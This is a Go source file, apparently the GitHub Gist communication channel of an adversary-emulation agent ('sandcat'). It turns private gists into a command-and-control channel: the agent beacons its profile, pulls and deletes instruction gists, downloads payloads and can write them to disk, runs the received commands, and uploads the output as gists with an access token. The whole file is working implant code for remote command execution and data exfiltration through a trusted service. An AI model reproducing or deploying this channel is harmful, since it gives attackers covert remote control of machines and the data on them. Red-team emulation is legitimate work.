package contact

import (
	"context"
	"encoding/json"
	"fmt"
	"github.com/google/go-github/github"
	"golang.org/x/oauth2"
	"math/rand"
	"path/filepath"
	"time"

	"../executors/execute"
	"../output"
	"../util"
)

const (
	githubTimeout = 60
	githubTimeoutResetInterval = 5
	githubError = 500
)

var (
	token = ""
	seededRand *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
	username string
)

type GIST struct {}

func init() {
	CommunicationChannels["GIST"] = GIST{}
}

//GetInstructions sends a beacon and returns instructions
func (g GIST) GetInstructions(profile map[string]interface{}) map[string]interface{} {
	checkValidSleepInterval(profile)
	bites, heartbeat := gistBeacon(profile)
	var out map[string]interface{}
	if heartbeat == true {
		if bites != nil {
			var commands interface{}
			json.Unmarshal(bites, &out)
			json.Unmarshal([]byte(out["instructions"].(string)), &commands)
			out["sleep"] = int(out["sleep"].(float64))
			out["watchdog"] = int(out["watchdog"].(float64))
			out["instructions"] = commands
		}
	}
	return out
}

//GetPayloadBytes load payload bytes from github
func (g GIST) GetPayloadBytes(payload string, server string, uniqueID string, platform string, writeToDisk bool) (string, []byte) {
	var payloadBytes []byte
	location := ""
	output.VerbosePrint(fmt.Sprintf("[*] Downloading new payload bytes: %s", payload))
	payloads := getGists("payloads", fmt.Sprintf("%s-%s", uniqueID, payload))
	if payloads[0] != "" {
		if writeToDisk {
			location = filepath.Join(payload)
			util.WritePayloadBytes(location, util.Decode(payloads[0]))
		} else {
			payloadBytes = util.Decode(payloads[0])
		}
	}
	return location, payloadBytes
}

//RunInstruction runs a single instruction
func (g GIST) RunInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string) {
	timeout := int(command["timeout"].(float64))
	result := make(map[string]interface{})
	outputData, status, pid := execute.RunCommand(command["command"].(string), payloads, command["executor"].(string), timeout)
	result["id"] = command["id"]
	result["output"] = outputData
	result["status"] = status
	result["pid"] = pid
	g.SendExecutionResults(profile, result)
}

//C2RequirementsMet determines if sandcat can use the selected comm channel
func (g GIST) C2RequirementsMet(profile map[string]interface{}, criteria map[string]string) bool {
	if len(criteria["c2Key"]) > 0 {
		token = criteria["c2Key"]
		profile["paw"] = getBeaconNameIdentifier()
		return true
	}
	return false
}

//SendExecutionResults send results to the server
func (g GIST) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}){
	profileCopy := make(map[string]interface{})
	for k,v := range profile {
		profileCopy[k] = v
	}
	results := [1]map[string]interface{}{result}
	profileCopy["results"] = results
	gistResults(profileCopy)
}


func gistBeacon(profile map[string]interface{}) ([]byte, bool) {
	heartbeat := createHeartbeatGist("beacon", profile)
	//collect instructions & delete
	contents := getGists("instructions", profile["paw"].(string))
	if contents != nil {
		return util.Decode(contents[0]), heartbeat
	}
	return nil, heartbeat
}

func createHeartbeatGist(gistType string, profile map[string]interface{}) bool {
	data, _ := json.Marshal(profile)

	if createGist(gistType, profile["paw"].(string), data) != created {
		output.VerbosePrint("[-] Heartbeat GIST: FAILED")
		return false
	}
	output.VerbosePrint("[+] Heartbeat GIST: SUCCESS")
	return true
}

func gistResults(result map[string]interface{}) {
	data, _ := json.Marshal(result)
	if createGist("results", result["paw"].(string), data) != created {
		output.VerbosePrint("[-] Results GIST: FAILED")
	} else {
		output.VerbosePrint("[+] Results GIST: SUCCESS")
	}
}


func createGist(gistType string, uniqueId string, data []byte) int {
	ctx := context.Background()
	c2Client := createNewClient()
	gistDescriptor := getGistDescriptor(gistType, uniqueId)
	stringified := string(util.Encode(data))
	file := github.GistFile{Content: &stringified,}
	files := make(map[github.GistFilename]github.GistFile)
	files[github.GistFilename(gistDescriptor)] = file
	public := false
	gist := github.Gist{Description: &gistDescriptor, Public: &public, Files: files,}
	_, resp, err := c2Client.Gists.Create(ctx, &gist)
	if err != nil {
		return githubError
	}
	return resp.StatusCode
}

func getGists(gistType string, uniqueID string) []string {
	ctx := context.Background()
	c2Client := createNewClient()
	var contents []string
	gists, _, err := c2Client.Gists.List(ctx, username, nil)
	if err == nil {
		for _, gist := range gists {
			if !*gist.Public && (*gist.Description == getGistDescriptor(gistType, uniqueID)) {
				fullGist, _, err := c2Client.Gists.Get(ctx, gist.GetID())
				if err == nil {
					for _, file := range fullGist.Files {
						contents = append(contents, *file.Content)
					}
				}
				c2Client.Gists.Delete(ctx, fullGist.GetID())
			}
		}
	}
	return contents
}

func getGistDescriptor(gistType string, uniqueId string) string {
	return fmt.Sprintf("%s-%s", gistType, uniqueId)
}

func checkValidSleepInterval(profile map[string]interface{}) {
	if profile["sleep"] == githubTimeout{
		util.Sleep(float64(githubTimeoutResetInterval))
	}
}

func getBeaconNameIdentifier() string {
	return fmt.Sprintf("%s", rand.Int())
}

func createNewClient() *github.Client {
	ctx := context.Background()
	ts := oauth2.StaticTokenSource(
		&oauth2.Token{AccessToken: token},
	)
	tc := oauth2.NewClient(ctx, ts)
	c2Client := github.NewClient(tc)
	return c2Client
}